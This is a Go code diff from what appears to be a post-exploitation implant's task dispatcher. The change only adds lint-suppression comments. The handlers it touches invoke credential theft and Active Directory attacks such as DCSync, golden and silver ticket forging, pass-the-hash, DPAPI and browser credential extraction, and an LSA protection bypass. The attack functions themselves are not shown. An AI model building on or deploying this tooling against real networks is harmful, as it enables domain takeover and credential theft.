@@ -41,8 +41,8 @@ func handleKerberoast(task Task, res *TaskResult) {
 }
 
 func handleDPAPIMasterKey(task Task, res *TaskResult) {
-	out, err := dpapiMasterKey()
-	if err != nil {
+	out, err := dpapiMasterKey() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {              //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -50,8 +50,8 @@ func handleDPAPIMasterKey(task Task, res *TaskResult) {
 }
 
 func handleDPAPIBlob(task Task, res *TaskResult) {
-	out, err := dpapiBlob(task.Command)
-	if err != nil {
+	out, err := dpapiBlob(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                     //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -59,8 +59,8 @@ func handleDPAPIBlob(task Task, res *TaskResult) {
 }
 
 func handleDPAPIBrowser(task Task, res *TaskResult) {
-	out, err := dpapiBrowser()
-	if err != nil {
+	out, err := dpapiBrowser() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {            //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -68,8 +68,8 @@ func handleDPAPIBrowser(task Task, res *TaskResult) {
 }
 
 func handleLSABypass(task Task, res *TaskResult) {
-	out, err := lsaBypass()
-	if err != nil {
+	out, err := lsaBypass() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {         //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -77,8 +77,8 @@ func handleLSABypass(task Task, res *TaskResult) {
 }
 
 func handleADCSFind(task Task, res *TaskResult) {
-	out, err := adcsFind()
-	if err != nil {
+	out, err := adcsFind() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {        //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -86,8 +86,8 @@ func handleADCSFind(task Task, res *TaskResult) {
 }
 
 func handleADCSRequest(task Task, res *TaskResult) {
-	out, err := adcsRequest(task.Command)
-	if err != nil {
+	out, err := adcsRequest(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                       //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -95,8 +95,8 @@ func handleADCSRequest(task Task, res *TaskResult) {
 }
 
 func handleShadowCreds(task Task, res *TaskResult) {
-	out, err := shadowCreds(task.Command)
-	if err != nil {
+	out, err := shadowCreds(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                       //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -108,8 +108,8 @@ func handleDCSync(task Task, res *TaskResult) {
 		res.Error = "dcsync is Windows-only"
 		return
 	}
-	out, err := kerberosDCSync(task.Command)
-	if err != nil {
+	out, err := kerberosDCSync(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                          //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
@@ -127,8 +127,8 @@ func handleGoldenTicket(task Task, res *TaskResult) {
 		res.Error = "format: user|domain|sid|krbtgt_hash"
 		return
 	}
-	out, err := kerberosGoldenTicket(parts[0], parts[1], parts[2], parts[3])
-	if err != nil {
+	out, err := kerberosGoldenTicket(parts[0], parts[1], parts[2], parts[3]) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                                                          //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
@@ -146,8 +146,8 @@ func handleSilverTicket(task Task, res *TaskResult) {
 		res.Error = "format: user|domain|sid|target|rc4_hash"
 		return
 	}
-	out, err := kerberosSilverTicket(parts[0], parts[1], parts[2], parts[3], parts[4])
-	if err != nil {
+	out, err := kerberosSilverTicket(parts[0], parts[1], parts[2], parts[3], parts[4]) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                                                                    //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
@@ -160,8 +160,8 @@ func handleASREPRoast(task Task, res *TaskResult) {
 		res.Error = "asreproast is Windows-only"
 		return
 	}
-	out, err := kerberosASREPRoast(task.Data)
-	if err != nil {
+	out, err := kerberosASREPRoast(task.Data) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                           //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
@@ -183,8 +183,8 @@ func handlePassTheHash(task Task, res *TaskResult) {
 	if len(parts) > 3 {
 		target = parts[3]
 	}
-	out, err := kerberosPassTheHash(parts[0], parts[1], parts[2], target)
-	if err != nil {
+	out, err := kerberosPassTheHash(parts[0], parts[1], parts[2], target) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                                                       //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
@@ -312,8 +312,8 @@ func handlePassTheTicket(task Task, res *TaskResult) {
 		res.Error = "pass_the_ticket is Windows-only"
 		return
 	}
-	out, err := kerberosPassTheTicket(task.Data)
-	if err != nil {
+	out, err := kerberosPassTheTicket(task.Data) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                              //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
@@ -363,8 +363,8 @@ func handleRemoteInput(task Task, res *TaskResult) {
 }
 
 func handleLDAPUsers(task Task, res *TaskResult) {
-	out, err := ldapUsers()
-	if err != nil {
+	out, err := ldapUsers() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {         //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -372,8 +372,8 @@ func handleLDAPUsers(task Task, res *TaskResult) {
 }
 
 func handleLDAPGroups(task Task, res *TaskResult) {
-	out, err := ldapGroups()
-	if err != nil {
+	out, err := ldapGroups() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {          //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -381,8 +381,8 @@ func handleLDAPGroups(task Task, res *TaskResult) {
 }
 
 func handleLDAPComputers(task Task, res *TaskResult) {
-	out, err := ldapComputers()
-	if err != nil {
+	out, err := ldapComputers() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {             //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -390,8 +390,8 @@ func handleLDAPComputers(task Task, res *TaskResult) {
 }
 
 func handleLDAPSPN(task Task, res *TaskResult) {
-	out, err := ldapSPN()
-	if err != nil {
+	out, err := ldapSPN() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {       //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -399,8 +399,8 @@ func handleLDAPSPN(task Task, res *TaskResult) {
 }
 
 func handleLDAPACL(task Task, res *TaskResult) {
-	out, err := ldapACL()
-	if err != nil {
+	out, err := ldapACL() //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {       //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
@@ -408,8 +408,8 @@ func handleLDAPACL(task Task, res *TaskResult) {
 }
 
 func handleLDAPQuery(task Task, res *TaskResult) {
-	out, err := ldapQuery(task.Command)
-	if err != nil {
+	out, err := ldapQuery(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+	if err != nil {                     //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 		res.Error = err.Error()
 	} else {
 		res.Output = out
